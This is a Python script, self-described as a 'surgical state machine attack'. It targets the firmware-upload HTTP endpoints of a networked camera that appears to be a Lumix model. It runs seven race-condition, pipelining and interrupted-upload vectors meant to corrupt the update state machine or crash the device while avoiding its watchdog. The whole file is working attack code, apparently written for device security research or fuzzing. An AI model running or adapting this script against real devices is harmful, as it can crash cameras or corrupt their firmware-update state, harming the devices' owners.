#!/usr/bin/env python3
"""
crash_v3c.py — Surgical state machine attack (keeps camera connected).

Key constraint: Must NOT trigger the 15s watchdog (which drops Wi-Fi).
Strategy:
  - Max 15 held connections at any time (below crash threshold)
  - Each pressure burst lasts <10s (below watchdog window)
  - Focus on state machine inconsistency, not raw resource exhaustion
  - Use timing to hit race windows between state transitions

Attack vectors (surgical):
  1. State inconsistency: start upload -> send partial data -> claim end
     -> start new upload -> send data to WRONG session
  2. Race: two connections simultaneously send endsenddata
  3. Race: startsenddata + abortsenddata in the same TCP packet (pipelined)
  4. Interrupt: send a valid chunk, close connection mid-read, immediately
     start a new session on a different connection
  5. Reuse: send a chunk, then send a SECOND chunk on the same connection
     without waiting for the first response (pipelining)
"""
import socket
import struct
import threading
import time
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, Net, parse_camrply, UA

IP = "192.168.1.131"
PORT = 80
TOTAL_SIZE = 90238464

def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)

def health(timeout=5):
    try:
        ka = KA(IP, port=PORT, timeout=timeout)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=getstate")
        r = parse_camrply(body).get("result", "?")
        ka.close()
        return r
    except:
        return "OFFLINE"

def wait_ok(max_wait=90):
    """Wait until camera returns ok."""
    start = time.time()
    while time.time() - start < max_wait:
        r = health(timeout=5)
        if r.lower() == "ok":
            return True
        time.sleep(5)
    return False

def vec1_state_inconsistency():
    """Vector 1: Create state inconsistency through conflicting operations.
    Safe: each request is quick, no held connections."""
    log("\n" + "="*60)
    log("VEC 1: State inconsistency (conflicting operations)")
    log("="*60)

    try:
        ka = KA(IP, port=PORT, timeout=10)

        # Normal: gate -> start -> chunks -> end
        # Attack: gate -> start -> chunk -> end -> start AGAIN -> chunk -> end
        # The second start should fail, but what if the end didn't fully clean up?

        log("  Normal sequence (control):")
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        log("    gate: %s" % parse_camrply(body).get("result", "?"))

        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("    start: %s" % parse_camrply(body).get("result", "?"))

        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=abortsenddata")
        log("    abort: %s" % parse_camrply(body).get("result", "?"))

        log("  Attack: rapid start-abort-start-abort x10:")
        for i in range(10):
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
            r1 = parse_camrply(body).get("result", "?")
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=abortsenddata")
            r2 = parse_camrply(body).get("result", "?")
            if i < 3 or i == 9:
                log("    %d: start=%s abort=%s" % (i, r1, r2))

        log("  Attack: start -> chunk -> end (premature) -> chunk again:")
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("    start: %s" % parse_camrply(body).get("result", "?"))

        # Send a chunk
        boundary = "=====S1"
        chunk = b"Y" * 10000
        body_m = ("--%s\r\n"
                  'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                  "Content-Type: application/octet-stream\r\n"
                  "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
        body_m = body_m.encode() + chunk + b"--%s--" % boundary.encode()
        req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
               "Host: %s\r\n"
               "User-Agent: LUMIX Sync\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
        st, _, body, dt = ka.send(req.encode() + body_m)
        log("    chunk1: %s (%.0fms)" % (parse_camrply(body).get("result", "?"), dt*1000))

        # End prematurely (only sent 1 chunk out of 1474)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
        log("    premature end: %s" % parse_camrply(body).get("result", "?"))

        # Try to send another chunk (should be rejected, but what if state is dirty?)
        st, _, body, dt = ka.send(req.encode() + body_m)
        log("    chunk-after-end: %s" % parse_camrply(body).get("result", "?"))

        # Start new session
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("    new start: %s" % parse_camrply(body).get("result", "?"))

        ka.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

def vec2_dual_endsenddata():
    """Vector 2: Two connections send endsenddata simultaneously."""
    log("\n" + "="*60)
    log("VEC 2: Dual endsenddata (race)")
    log("="*60)

    try:
        ka = KA(IP, port=PORT, timeout=10)
        ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        ka.close()

        results = []
        def ender(tid):
            try:
                s = socket.create_connection((IP, PORT), timeout=5)
                s.settimeout(5)
                req = ("GET /cam.cgi?mode=endsenddata HTTP/1.1\r\n"
                       "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                t0 = time.time()
                s.sendall(req)
                resp = s.recv(4096)
                results.append((tid, resp[:50], time.time()-t0))
                s.close()
            except Exception as e:
                results.append((tid, "EXC", 0))

        # Fire both simultaneously
        t1 = threading.Thread(target=ender, args=(1,))
        t2 = threading.Thread(target=ender, args=(2,))
        t1.start()
        t2.start()
        t1.join(timeout=6)
        t2.join(timeout=6)

        for tid, resp, dt in results:
            log("  ender %d: %.0fms: %s" % (tid, dt*1000, resp))
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

def vec3_pipelined_requests():
    """Vector 3: Send multiple requests in one TCP send (HTTP pipelining).
    If the camera's HTTP parser doesn't handle pipelined requests, this
    could confuse the request boundary detection."""
    log("\n" + "="*60)
    log("VEC 3: HTTP request pipelining")
    log("="*60)

    # Build 3 pipelined requests
    req1 = ("GET /cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00 HTTP/1.1\r\n"
            "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
    req2 = ("GET /cam.cgi?mode=startsenddata&type=fw&value=%d HTTP/1.1\r\n"
            "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % (TOTAL_SIZE, IP)).encode()
    req3 = ("GET /cam.cgi?mode=endsenddata HTTP/1.1\r\n"
            "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()

    attempts = [
        ("2 pipelined (start + end)", req1 + req2),
        ("3 pipelined (gate + start + end)", req1 + req2 + req3),
        ("4 pipelined (x2 start + x2 abort)", req2 + req2 + b"GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n" + b"GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n"),
        ("5 pipelined (mixed)", req1 + req2 + req3 + req2 + req3),
    ]

    for name, payload in attempts:
        try:
            s = socket.create_connection((IP, PORT), timeout=10)
            s.settimeout(10)
            s.sendall(payload)
            resp = b""
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
                if len(resp) > 65536:
                    break
            s.close()
            log("  %s: %d bytes back" % (name, len(resp)))
            # Show first 200 bytes
            log("    %.100s..." % resp[:100])
        except Exception as e:
            log("  %s: EXC %s" % (name, type(e).__name__))
        time.sleep(2)

def vec4_interrupt_midread():
    """Vector 4: Send a chunk, close the connection BEFORE the camera finishes
    reading it, then immediately start a new session. The camera may still
    be processing the old chunk when the new session begins."""
    log("\n" + "="*60)
    log("VEC 4: Interrupt mid-read + immediate new session")
    log("="*60)

    try:
        ka = KA(IP, port=PORT, timeout=10)
        ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        ka.close()

        # Build a chunk request
        boundary = "=====INT4"
        chunk = b"Z" * 30000
        body_m = ("--%s\r\n"
                  'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                  "Content-Type: application/octet-stream\r\n"
                  "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
        body_m = body_m.encode() + chunk + b"--%s--" % boundary.encode()
        req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
               "Host: %s\r\n"
               "User-Agent: LUMIX Sync\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
        req_bytes = req.encode() + body_m

        # Send only the first half of the request, then close
        log("  Sending partial chunk (half) then closing...")
        s = socket.create_connection((IP, PORT), timeout=5)
        s.settimeout(5)
        half = len(req_bytes) // 2
        s.sendall(req_bytes[:half])
        time.sleep(0.1)  # give camera time to start reading
        s.close()  # close WITHOUT sending the rest

        # IMMEDIATELY start a new session on a different connection
        log("  Immediately starting new session...")
        time.sleep(0.05)  # tiny delay
        ka2 = KA(IP, port=PORT, timeout=10)
        st, _, body, dt = ka2.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("  new start: %s (%.0fms)" % (parse_camrply(body).get("result", "?"), dt*1000))

        # Send a chunk to the new session
        st, _, body, dt = ka2.send(req.encode() + body_m)
        log("  chunk to new session: %s (%.0fms)" % (parse_camrply(body).get("result", "?"), dt*1000))

        # End
        st, _, body, dt = ka2.request("GET", "/cam.cgi?mode=endsenddata")
        log("  end: %s" % parse_camrply(body).get("result", "?"))

        ka2.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

def vec5_pipelined_data():
    """Vector 5: Send a chunk, then WITHOUT waiting for the response,
    send another request on the same connection. This tests if the
    camera's HTTP server properly handles the response before the
    next request."""
    log("\n" + "="*60)
    log("VEC 5: Pipelined data (chunk + next req without waiting)")
    log("="*60)

    try:
        ka = KA(IP, port=PORT, timeout=10)
        ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)

        # Build two chunk requests
        boundary = "=====PIPE5"
        chunk1 = b"1" * 10000
        body1 = ("--%s\r\n"
                 'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                 "Content-Type: application/octet-stream\r\n"
                 "Content-Length: %d\r\n\r\n" % (boundary, len(chunk1)))
        body1 = body1.encode() + chunk1 + b"--%s--" % boundary.encode()
        req1 = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: LUMIX Sync\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body1)))

        req2 = ("GET /cam.cgi?mode=endsenddata HTTP/1.1\r\n"
                "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()

        # Send both in one shot (pipelined)
        log("  Sending chunk + endsenddata pipelined...")
        combined = req1.encode() + body1 + req2
        s = socket.create_connection((IP, PORT), timeout=10)
        s.settimeout(10)
        s.sendall(combined)

        # Read all responses
        resp = b""
        while True:
            try:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
            except:
                break
        s.close()

        log("  Got %d bytes back:" % len(resp))
        # Parse how many responses we got
        count = resp.count(b"HTTP/1.")
        log("  Parsed %d HTTP responses" % count)
        log("  First 200: %.200s" % resp[:200])

        ka.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

def vec6_double_start_same_conn():
    """Vector 6: Send two startsenddata in a row on the same connection
    without any other request in between. If the first one puts the
    camera in "upload in progress" state, the second might behave
    unexpectedly."""
    log("\n" + "="*60)
    log("VEC 6: Double startsenddata on same connection")
    log("="*60)

    try:
        ka = KA(IP, port=PORT, timeout=10)
        ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")

        log("  First startsenddata:")
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("    -> %s" % parse_camrply(body).get("result", "?"))

        log("  Second startsenddata (no abort in between):")
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        log("    -> %s" % parse_camrply(body).get("result", "?"))

        # Now send a chunk (which session does it go to?)
        boundary = "=====DBL6"
        chunk = b"D" * 5000
        body_m = ("--%s\r\n"
                  'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                  "Content-Type: application/octet-stream\r\n"
                  "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
        body_m = body_m.encode() + chunk + b"--%s--" % boundary.encode()
        req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
               "Host: %s\r\n"
               "User-Agent: LUMIX Sync\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
        st, _, body, dt = ka.send(req.encode() + body_m)
        log("  Chunk after double-start: %s (%.0fms)" % (parse_camrply(body).get("result", "?"), dt*1000))

        ka.request("GET", "/cam.cgi?mode=abortsenddata")
        ka.close()
    except Exception as e:
        log("  EXC: %s: %s" % (type(e).__name__, e))

def vec7_timing_precision():
    """Vector 7: Time the exact moment between startsenddata and the
    first chunk. Try different delays to find a race window."""
    log("\n" + "="*60)
    log("VEC 7: Timing precision (varying delay after start)")
    log("="*60)

    delays = [0.001, 0.005, 0.01, 0.02, 0.05, 0.1, 0.2, 0.5, 1.0, 2.0]

    for delay in delays:
        try:
            ka = KA(IP, port=PORT, timeout=10)
            ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
            r1 = parse_camrply(body).get("result", "?")

            time.sleep(delay)

            # Send chunk
            boundary = "=====T7"
            chunk = b"T" * 5000
            body_m = ("--%s\r\n"
                      'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
            body_m = body_m.encode() + chunk + b"--%s--" % boundary.encode()
            req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
                   "Host: %s\r\n"
                   "User-Agent: LUMIX Sync\r\n"
                   "Content-Type: multipart/form-data; boundary=%s\r\n"
                   "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
            st, _, body, dt = ka.send(req.encode() + body_m)
            r2 = parse_camrply(body).get("result", "?")

            ka.request("GET", "/cam.cgi?mode=abortsenddata")
            ka.close()

            log("  delay=%.3fs: start=%s chunk=%s" % (delay, r1, r2))
        except Exception as e:
            log("  delay=%.3fs: EXC %s" % (delay, type(e).__name__))
        time.sleep(1)

def main():
    log("S5 Camera CRASH v3c - Surgical state machine attack")
    log("Target: %s" % IP)
    log("Constraint: Keep camera connected (no watchdog trigger)")
    log("")

    # Wait for camera to be ready
    log("Waiting for camera...")
    if not wait_ok(90):
        log("Camera not ready. Aborting.")
        return
    log("Camera ready.")

    vectors = [
        (1, vec1_state_inconsistency, "State inconsistency"),
        (2, vec2_dual_endsenddata, "Dual endsenddata race"),
        (3, vec3_pipelined_requests, "HTTP pipelining"),
        (4, vec4_interrupt_midread, "Interrupt mid-read"),
        (5, vec5_pipelined_data, "Pipelined data"),
        (6, vec6_double_start_same_conn, "Double start"),
        (7, vec7_timing_precision, "Timing precision"),
    ]

    for num, func, name in vectors:
        log("\n>>> VEC %d: %s" % (num, name))
        try:
            func()
        except Exception as e:
            log("  VEC %d EXCEPTION: %s: %s" % (num, type(e).__name__, e))

        # Post-vector health check (camera should stay up)
        time.sleep(2)
        r = health(timeout=5)
        if r.lower() == "ok":
            log("  [post-%d] OK" % num)
        else:
            log("  [post-%d] NOT OK: %s - waiting..." % (num, r))
            if not wait_ok(60):
                log("  !! Camera not recovering. Stopping.")
                return

    log("\n" + "="*60)
    log("ALL VECTORS COMPLETE")
    log("="*60)
    r = health(timeout=5)
    log("Final: %s" % r)

if __name__ == "__main__":
    main()
